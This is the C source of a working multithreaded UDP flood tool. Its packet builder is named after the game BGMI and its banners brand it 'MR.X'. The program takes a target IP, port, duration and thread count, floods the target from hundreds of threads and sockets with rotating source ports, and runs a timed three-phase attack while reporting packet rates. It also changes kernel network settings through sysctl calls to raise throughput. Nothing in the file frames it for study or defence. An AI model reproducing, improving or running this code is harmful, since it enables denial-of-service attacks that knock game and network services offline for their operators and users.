#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <stdatomic.h>
#include <sched.h>
#include <errno.h>
#include <sys/time.h>

#define FLOOD_SOCKETS 384
#define MIN_PACKET_SIZE 20
#define MAX_PACKET_SIZE 128
#define MIN_THREADS 50
#define MAX_THREADS 999
#define MIN_ATTACK_TIME 60
#define MAX_ATTACK_TIME 300
#define MAX_RETRY_ATTEMPTS 3
#define BATCH_UPDATE_COUNT 10000
#define BASE_BURST_SIZE 250
#define MAX_BURST_SIZE 800
#define PHASE1_DURATION 22
#define PHASE2_DURATION 8
#define PHASE1_STRENGTH 120
#define PHASE3_STRENGTH 150
#define NORMAL_PORT_ROTATE 25
#define DIRECT_PORT_ROTATE 300
#define PORT_RANGE 64000

char *TARGET_IP;
int TARGET_PORT;
int ATTACK_TIME;
int PACKET_SIZE;
int THREAD_COUNT;

_Atomic unsigned long long total_packets = 0;
_Atomic unsigned long long total_bytes = 0;
_Atomic unsigned long long peak_pps = 0;
_Atomic int stop_signal = 0;
_Atomic int attack_phase = 1;

struct sockaddr_in target_addr;

void optimize_kernel() {
#ifdef __linux__
    if (geteuid() == 0) {
        system("sysctl -w net.core.wmem_max=4294967296 >/dev/null 2>&1");
        system("sysctl -w net.core.wmem_default=268435456 >/dev/null 2>&1");
        system("sysctl -w net.core.netdev_max_backlog=8000000 >/dev/null 2>&1");
        system("sysctl -w net.ipv4.udp_mem='268435456 268435456 268435456' >/dev/null 2>&1");
        system("sysctl -w net.ipv4.ip_local_port_range='1024 65000' >/dev/null 2>&1");
        system("sysctl -w net.core.optmem_max=67108864 >/dev/null 2>&1");
        system("sysctl -w net.ipv4.udp_rmem_min=16384 >/dev/null 2>&1");
        system("sysctl -w net.ipv4.udp_wmem_min=16384 >/dev/null 2>&1");
    } else {
        system("sysctl -w net.core.wmem_max=134217728 >/dev/null 2>&1");
        system("sysctl -w net.core.wmem_default=67108864 >/dev/null 2>&1");
        system("sysctl -w net.ipv4.udp_mem='67108864 67108864 67108864' >/dev/null 2>&1");
    }
#endif
}

void set_sock_buf(int sock) {
    int send_buf, recv_buf;
    
    if (geteuid() == 0) {
        send_buf = 268435456;
        recv_buf = 134217728;
    } else {
        send_buf = 67108864;
        recv_buf = 33554432;
    }
    
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &send_buf, sizeof(send_buf));
    setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &recv_buf, sizeof(recv_buf));
    
    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
#ifdef SO_REUSEPORT
    setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));
#endif
}

unsigned int fast_rand(unsigned int *seed) {
    *seed = (*seed * 1103515245 + 12345);
    return *seed ^ (*seed >> 16);
}

// 100% FIXED - NO BOUNDS ISSUES
void create_bgmi_packet(char *buf, int size, int pattern_type, int thread_id, int seq, unsigned int seed) {
    // Step 1: Ensure valid size
    if (size < MIN_PACKET_SIZE) size = MIN_PACKET_SIZE;
    if (size > MAX_PACKET_SIZE) size = MAX_PACKET_SIZE;
    
    // Step 2: Clear entire buffer
    memset(buf, 0, size);
    
    // Step 3: Calculate values safely
    int enhanced_pattern = (pattern_type + (seq % 7)) % 4;
    unsigned int rseed = seed ^ ((unsigned int)thread_id << 16) ^ (unsigned int)seq;
    
    // Step 4: Write header (bytes 0-3) - ALWAYS SAFE (size >= 20)
    buf[0] = (char)(0xDE ^ (thread_id & 0x3F));
    buf[1] = (char)(0xAD ^ ((thread_id >> 6) & 0x3F));
    buf[2] = (char)enhanced_pattern;
    buf[3] = (char)(size & 0xFF);
    
    // Step 5: Write thread_seq (bytes 4-7) - SAFE (size >= 20)
    unsigned int thread_seq = ((unsigned int)thread_id << 16) | ((unsigned int)seq & 0xFFFF);
    if (size >= 8) {
        memcpy(buf + 4, &thread_seq, 4);
    }
    
    // Step 6: Write timestamp (bytes 8-11) - SAFE (size >= 20)
    unsigned int timestamp = (unsigned int)time(NULL);
    if (size >= 12) {
        memcpy(buf + 8, &timestamp, 4);
    }
    
    // Step 7: Fill remaining data from byte 12
    int data_start = 12;
    int max_fill = size - 2;  // Leave 2 bytes for checksum
    int bytes_to_fill = max_fill - data_start;
    
    if (bytes_to_fill > 0) {
        // Fill safely
        for (int i = 0; i < bytes_to_fill; i++) {
            int pos = data_start + i;
            if (pos < size - 2) {  // Double check
                rseed = rseed * 1103515245 + 12345 + i;
                buf[pos] = (char)((rseed ^ (i * 0x9E3779B9) ^ thread_seq) & 0xFF);
            }
        }
    }
    
    // Step 8: Write checksum (last 2 bytes) - SAFE
    if (size >= 2) {
        unsigned short checksum = (unsigned short)((thread_id * 777) + (seq * 13) + size);
        memcpy(buf + size - 2, &checksum, 2);
    }
}

int bind_random_port(int sock) {
    struct sockaddr_in src_addr;
    int max_attempts = 5;
    int base_port = 1024;
    
    for (int attempt = 0; attempt < max_attempts; attempt++) {
        memset(&src_addr, 0, sizeof(src_addr));
        src_addr.sin_family = AF_INET;
        src_addr.sin_port = htons(base_port + (rand() % (65535 - base_port - 1)));
        src_addr.sin_addr.s_addr = INADDR_ANY;
        
        if (bind(sock, (struct sockaddr*)&src_addr, sizeof(src_addr)) == 0) {
            return 1;
        }
        
        base_port = 10000 + (rand() % 40000);
        usleep(1000);
    }
    
    memset(&src_addr, 0, sizeof(src_addr));
    src_addr.sin_family = AF_INET;
    src_addr.sin_port = 0;
    src_addr.sin_addr.s_addr = INADDR_ANY;
    
    if (bind(sock, (struct sockaddr*)&src_addr, sizeof(src_addr)) == 0) {
        return 1;
    }
    
    close(sock);
    return 0;
}

void *direct_attack(void *arg) {
    int thread_idx = *((int *)arg);
    int socks[FLOOD_SOCKETS];
    char packets[FLOOD_SOCKETS][MAX_PACKET_SIZE];
    
    for (int i = 0; i < FLOOD_SOCKETS; i++) {
        socks[i] = -1;
    }
    
    int active_socks = 0;
    for (int i = 0; i < FLOOD_SOCKETS; i++) {
        socks[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (socks[i] < 0) continue;
        
        set_sock_buf(socks[i]);
        fcntl(socks[i], F_SETFL, O_NONBLOCK);
        
        if (bind_random_port(socks[i])) {
            active_socks++;
        } else {
            close(socks[i]);
            socks[i] = -1;
        }
    }
    
    if (active_socks == 0) {
        return NULL;
    }
    
    unsigned long long local_packets = 0;
    unsigned long long local_bytes = 0;
    int seq_counter = thread_idx * 10000;
    int port_change_counter = 0;
    unsigned int seed = (thread_idx * 1234567U) ^ (unsigned int)time(NULL) ^ (unsigned int)getpid();
    int current_phase = 1;
    int burst_size = (BASE_BURST_SIZE * PHASE1_STRENGTH) / 100;
    struct timeval last_send_time;
    gettimeofday(&last_send_time, NULL);
    
    int adaptive_sleep = 300;
    if (PACKET_SIZE <= 32) {
        burst_size *= 2;
        adaptive_sleep = 150;
    } else if (PACKET_SIZE >= 96) {
        burst_size = burst_size * 3 / 4;
        adaptive_sleep = 400;
    }
    
    while (!atomic_load(&stop_signal)) {
        current_phase = atomic_load(&attack_phase);
        
        if (current_phase == 2) {
            usleep(5000);
            continue;
        }
        
        if (current_phase == 1) {
            burst_size = (BASE_BURST_SIZE * PHASE1_STRENGTH) / 100;
            if (PACKET_SIZE <= 32) burst_size *= 2;
        } else if (current_phase == 3) {
            burst_size = (BASE_BURST_SIZE * PHASE3_STRENGTH) / 100;
            if (burst_size > MAX_BURST_SIZE) burst_size = MAX_BURST_SIZE;
        }
        
        int pattern = (seq_counter / 37) % 4;
        
        for (int i = 0; i < FLOOD_SOCKETS && !atomic_load(&stop_signal); i++) {
            if (socks[i] < 0) continue;
            
            create_bgmi_packet(packets[i], PACKET_SIZE, pattern, thread_idx + 1000, seq_counter, seed);
            
            int packets_sent = 0;
            for (int burst = 0; burst < burst_size && !atomic_load(&stop_signal); burst++) {
                int ret = sendto(socks[i], packets[i], PACKET_SIZE, MSG_DONTWAIT,
                                (struct sockaddr*)&target_addr, sizeof(target_addr));
                
                if (ret > 0) {
                    local_packets++;
                    local_bytes += PACKET_SIZE;
                    seq_counter++;
                    packets_sent++;
                } else if (errno == EAGAIN || errno == EWOULDBLOCK) {
                    break;
                }
            }
        }
        
        if (local_packets >= BATCH_UPDATE_COUNT) {
            atomic_fetch_add(&total_packets, local_packets);
            atomic_fetch_add(&total_bytes, local_bytes);
            local_packets = 0;
            local_bytes = 0;
        }
        
        port_change_counter++;
        if (port_change_counter >= DIRECT_PORT_ROTATE) {
            for (int i = 0; i < FLOOD_SOCKETS; i++) {
                if (socks[i] >= 0) {
                    bind_random_port(socks[i]);
                }
            }
            port_change_counter = 0;
        }
        
        struct timeval current_time;
        gettimeofday(&current_time, NULL);
        long elapsed_us = (current_time.tv_sec - last_send_time.tv_sec) * 1000000 + 
                         (current_time.tv_usec - last_send_time.tv_usec);
        
        if (elapsed_us < adaptive_sleep) {
            usleep(adaptive_sleep - elapsed_us);
        }
        gettimeofday(&last_send_time, NULL);
        
        if (seq_counter % 5000 == 0) {
            sched_yield();
        }
    }
    
    if (local_packets > 0) {
        atomic_fetch_add(&total_packets, local_packets);
        atomic_fetch_add(&total_bytes, local_bytes);
    }
    
    for (int i = 0; i < FLOOD_SOCKETS; i++) {
        if (socks[i] >= 0) {
            close(socks[i]);
        }
    }
    
    return NULL;
}

void *attack_thread(void *arg) {
    int tid = *((int *)arg);
    
#ifdef __linux__
    cpu_set_t cs;
    CPU_ZERO(&cs);
    int cpus = sysconf(_SC_NPROCESSORS_ONLN);
    if (cpus > 0) {
        CPU_SET(tid % cpus, &cs);
        pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cs);
    }
#endif
    
    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s < 0) return NULL;
    
    set_sock_buf(s);
    fcntl(s, F_SETFL, O_NONBLOCK);
    
    struct sockaddr_in src_addr;
    memset(&src_addr, 0, sizeof(src_addr));
    src_addr.sin_family = AF_INET;
    src_addr.sin_port = 0;
    src_addr.sin_addr.s_addr = INADDR_ANY;
    
    if (bind(s, (struct sockaddr*)&src_addr, sizeof(src_addr)) < 0) {
        close(s);
        return NULL;
    }
    
    char packet[MAX_PACKET_SIZE];
    
    unsigned long long local_packets = 0;
    unsigned long long local_bytes = 0;
    int seq_local = tid * 7777;
    int port_change = 0;
    unsigned int seed = (tid * 7654321U) ^ (unsigned int)clock() ^ (unsigned int)pthread_self();
    int current_phase = 1;
    int burst_size = (BASE_BURST_SIZE * PHASE1_STRENGTH) / 100;
    struct timeval last_send_time;
    gettimeofday(&last_send_time, NULL);
    
    int thread_power = 1;
    int sleep_time = 300;
    
    if (PACKET_SIZE <= 32) {
        thread_power = 2;
        sleep_time = 150;
    } else if (PACKET_SIZE >= 96) {
        thread_power = 1;
        sleep_time = 400;
    }
    
    burst_size = burst_size * thread_power;
    if (burst_size > MAX_BURST_SIZE * 2) burst_size = MAX_BURST_SIZE * 2;
    
    while (!atomic_load(&stop_signal)) {
        current_phase = atomic_load(&attack_phase);
        
        if (current_phase == 2) {
            usleep(8000);
            continue;
        }
        
        if (current_phase == 1) {
            burst_size = (BASE_BURST_SIZE * PHASE1_STRENGTH) / 100 * thread_power;
        } else if (current_phase == 3) {
            burst_size = (BASE_BURST_SIZE * PHASE3_STRENGTH) / 100 * thread_power;
            if (burst_size > MAX_BURST_SIZE * 2) burst_size = MAX_BURST_SIZE * 2;
        }
        
        int pattern = (seq_local / 53) % 4;
        
        int packets_sent = 0;
        for (int burst = 0; burst < burst_size && !atomic_load(&stop_signal); burst++) {
            create_bgmi_packet(packet, PACKET_SIZE, pattern, tid, seq_local + burst, seed);
            
            int ret = sendto(s, packet, PACKET_SIZE, MSG_DONTWAIT,
                           (struct sockaddr *)&target_addr, sizeof(target_addr));
            
            if (ret > 0) {
                local_packets++;
                local_bytes += PACKET_SIZE;
                seq_local++;
                packets_sent++;
                
                port_change++;
                if (port_change >= NORMAL_PORT_ROTATE) {
                    src_addr.sin_port = 0;
                    bind(s, (struct sockaddr*)&src_addr, sizeof(src_addr));
                    port_change = 0;
                }
            } else if (errno == EAGAIN || errno == EWOULDBLOCK) {
                break;
            }
        }
        
        struct timeval current_time;
        gettimeofday(&current_time, NULL);
        long elapsed_us = (current_time.tv_sec - last_send_time.tv_sec) * 1000000 + 
                         (current_time.tv_usec - last_send_time.tv_usec);
        
        if (elapsed_us < sleep_time) {
            usleep(sleep_time - elapsed_us);
        }
        gettimeofday(&last_send_time, NULL);
        
        if (local_packets >= BATCH_UPDATE_COUNT) {
            atomic_fetch_add(&total_packets, local_packets);
            atomic_fetch_add(&total_bytes, local_bytes);
            local_packets = 0;
            local_bytes = 0;
        }
        
        if (seq_local % 2000 == 0) {
            sched_yield();
        }
    }
    
    if (local_packets > 0) {
        atomic_fetch_add(&total_packets, local_packets);
        atomic_fetch_add(&total_bytes, local_bytes);
    }
    
    close(s);
    return NULL;
}

void *phase_controller(void *arg) {
    printf("\n🔥 MR.X FATHER OF TG 🔥\n\n");
    printf("🦋 MR.X (22s @ %d%% POWER)\n\n", PHASE1_STRENGTH);
    
    atomic_store(&attack_phase, 1);
    sleep(PHASE1_DURATION);
    
    printf("\n⏰️ Power  (8s)\n\n");
    atomic_store(&attack_phase, 2);
    sleep(PHASE2_DURATION);
    
    int phase3_time = ATTACK_TIME - PHASE1_DURATION - PHASE2_DURATION;
    if (phase3_time < 1) phase3_time = 1;
    
    printf("\n🔥 MR.X 3: (%ds @ %d%% POWER)\n\n", phase3_time, PHASE3_STRENGTH);
    atomic_store(&attack_phase, 3);
    
    sleep(phase3_time);
    
    atomic_store(&stop_signal, 1);
    
    return NULL;
}

void *stats_monitor(void *arg) {
    sleep(1);
    
    unsigned long long prev_packets = atomic_load(&total_packets);
    unsigned long long prev_bytes = atomic_load(&total_bytes);
    unsigned long long current_peak = 0;
    unsigned long long peak_mbps = 0;
    
    int elapsed = 0;
    int current_phase = 1;
    
    while (elapsed < ATTACK_TIME && !atomic_load(&stop_signal)) {
        sleep(1);
        elapsed++;
        
        if (elapsed == PHASE1_DURATION) current_phase = 2;
        if (elapsed == PHASE1_DURATION + PHASE2_DURATION) current_phase = 3;
        
        unsigned long long curr_packets = atomic_load(&total_packets);
        unsigned long long curr_bytes = atomic_load(&total_bytes);
        
        unsigned long long pps = curr_packets - prev_packets;
        unsigned long long bytes_diff = curr_bytes - prev_bytes;
        
        if (pps > atomic_load(&peak_pps)) {
            atomic_store(&peak_pps, pps);
        }
        
        if (pps > current_peak) {
            current_peak = pps;
        }
        
        double megabytes = bytes_diff / (1024.0 * 1024.0);
        double mbps = (bytes_diff * 8.0) / (1024.0 * 1024.0);
        
        if (mbps > peak_mbps) {
            peak_mbps = mbps;
        }
        
        if (current_phase == 1) {
            printf("🦋 PPS: %lluK | Mbps: %.1f | Peak: %lluK\n", 
                   pps/1000, mbps, current_peak/1000);
        } else if (current_phase == 2) {
            printf("⏰️ (Wait  🙏 MR.X)\n");
        } else {
            printf("🔥 PPS: %lluK | Mbps: %.1f | Peak: %lluK\n", 
                   pps/1000, mbps, current_peak/1000);
        }
        
        prev_packets = curr_packets;
        prev_bytes = curr_bytes;
    }
    
    unsigned long long total_p = atomic_load(&total_packets);
    unsigned long long total_b = atomic_load(&total_bytes);
    
    if (ATTACK_TIME > 0) {
        double avg_pps = total_p / (double)ATTACK_TIME;
        double total_mb = total_b / (1024.0 * 1024.0);
        double avg_mbps = (total_b * 8.0) / (ATTACK_TIME * 1024.0 * 1024.0);
        
        printf("\n🚀 MR.X NEVER END 🚀\n\n");
        printf("✅ Total Packets: %llu\n", total_p);
        printf("🚀 AVERAGE PPS: %.0fK\n", avg_pps/1000);
        printf("📈 AVERAGE Mbps: %.1f\n", avg_mbps);
        printf("💾 Total Data: %.2fGB\n", total_mb/1024.0);
    }
    
    return NULL;
}

int main(int argc, char *argv[]) {
    setvbuf(stdout, NULL, _IONBF, 0);
    
    if (argc != 6) {
        printf("Usage: %s IP PORT TIME SIZE THREADS\n", argv[0]);
        return 1;
    }
    
    TARGET_IP = argv[1];
    TARGET_PORT = atoi(argv[2]);
    ATTACK_TIME = atoi(argv[3]);
    PACKET_SIZE = atoi(argv[4]);
    THREAD_COUNT = atoi(argv[5]);
    
    if (ATTACK_TIME < MIN_ATTACK_TIME) ATTACK_TIME = MIN_ATTACK_TIME;
    if (ATTACK_TIME > MAX_ATTACK_TIME) ATTACK_TIME = MAX_ATTACK_TIME;
    if (PACKET_SIZE < MIN_PACKET_SIZE) PACKET_SIZE = MIN_PACKET_SIZE;
    if (PACKET_SIZE > MAX_PACKET_SIZE) PACKET_SIZE = MAX_PACKET_SIZE;
    if (THREAD_COUNT < MIN_THREADS) THREAD_COUNT = MIN_THREADS;
    if (THREAD_COUNT > MAX_THREADS) THREAD_COUNT = MAX_THREADS;
    
    if (PACKET_SIZE <= 32) {
        int optimal_threads = THREAD_COUNT + 150;
        if (optimal_threads > MAX_THREADS) optimal_threads = MAX_THREADS;
        if (optimal_threads > THREAD_COUNT) {
            printf("Auto-adjusted threads from %d to %d (small packets)\n", 
                   THREAD_COUNT, optimal_threads);
            THREAD_COUNT = optimal_threads;
        }
    } else if (PACKET_SIZE >= 96) {
        int optimal_threads = THREAD_COUNT - 100;
        if (optimal_threads < MIN_THREADS) optimal_threads = MIN_THREADS;
        if (optimal_threads < THREAD_COUNT) {
            printf("Auto-adjusted threads from %d to %d (large packets)\n", 
                   THREAD_COUNT, optimal_threads);
            THREAD_COUNT = optimal_threads;
        }
    }
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(TARGET_PORT);
    
    if (inet_pton(AF_INET, TARGET_IP, &target_addr.sin_addr) <= 0) {
        printf("Invalid IP address\n");
        return 1;
    }
    
    printf("Target: %s:%d | Time: %ds\n", TARGET_IP, TARGET_PORT, ATTACK_TIME);
    printf("Packet: %d bytes | Threads: %d\n", PACKET_SIZE, THREAD_COUNT);
    
    struct timeval tv;
    gettimeofday(&tv, NULL);
    srand(tv.tv_usec ^ getpid() ^ ((unsigned int)time(NULL) << 16));
    
    optimize_kernel();
    
    int direct_thread_id = 999999;
    pthread_t direct_thread;
    pthread_create(&direct_thread, NULL, direct_attack, &direct_thread_id);
    
    pthread_t *threads = (pthread_t *)malloc(THREAD_COUNT * sizeof(pthread_t));
    int *tids = (int *)malloc(THREAD_COUNT * sizeof(int));
    
    if (!threads || !tids) {
        atomic_store(&stop_signal, 1);
        pthread_join(direct_thread, NULL);
        return 1;
    }
    
    printf("Creating %d attack threads\n", THREAD_COUNT);
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        tids[i] = i;
        pthread_create(&threads[i], NULL, attack_thread, &tids[i]);
    }
    
    pthread_t phase_thread;
    pthread_create(&phase_thread, NULL, phase_controller, NULL);
    
    pthread_t monitor_thread;
    pthread_create(&monitor_thread, NULL, stats_monitor, NULL);
    
    int remaining_time = ATTACK_TIME;
    while (remaining_time > 0 && !atomic_load(&stop_signal)) {
        sleep(1);
        remaining_time--;
    }
    
    if (!atomic_load(&stop_signal)) {
        atomic_store(&stop_signal, 1);
    }
    
    usleep(200000);
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        if (tids[i] != -1) {
            pthread_join(threads[i], NULL);
        }
    }
    
    pthread_join(direct_thread, NULL);
    pthread_join(phase_thread, NULL);
    pthread_join(monitor_thread, NULL);
    
    free(threads);
    free(tids);
    
    printf("Cleanup complete\n");
    
    return 0;
}